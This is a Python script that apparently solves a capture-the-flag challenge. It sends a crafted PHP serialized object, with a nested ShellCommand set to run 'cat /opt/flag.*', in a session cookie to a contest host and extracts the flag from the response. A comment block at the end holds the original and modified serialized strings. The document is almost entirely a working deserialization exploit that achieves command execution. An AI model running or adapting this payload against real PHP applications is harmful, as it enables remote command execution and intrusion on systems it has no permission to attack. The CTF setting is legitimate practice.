import requests
import urllib
import re

req = requests.session()

url = 'http://hackfest.redrocket.club:65129/'

exploit = 'O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";s:5:"guest";s:2:"db";O:12:"ShellCommand":2:{s:5:"is_ok";b:1;s:3:"cmd";s:15:"cat /opt/flag.*";}s:6:"active";b:1;}'

payload = urllib.parse.quote(exploit)

cookie = {'session':payload}

res = req.get(url, cookies=cookie).text

flag = 'flag' + re.findall(r'\{.*?\}', res)[0]

print(flag)

'''

# Original
O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";s:5:"guest";s:2:"db";O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}s:6:"active";b:1;}
O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";O:12:"ShellCommand":2:{s:5:"is_ok";b:1;s:3:"cmd";s:15:"cat /opt/flag.*";}s:2:"db";O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}s:6:"active";b:1;}
# Original
s:3:"uid";i:1337;
s:4:"name";s:5:"admin";
s:2:"db";O:2:"DB":1:{s:9:"db_driver";O:8:"DBDriver":0:{}}
s:6:"active";b:1;
# Payload raw
O:12:"ShellCommand":2:{s:5:"is_ok";b:1;s:3:"cmd";s:15:"cat /opt/flag.*";}
'''
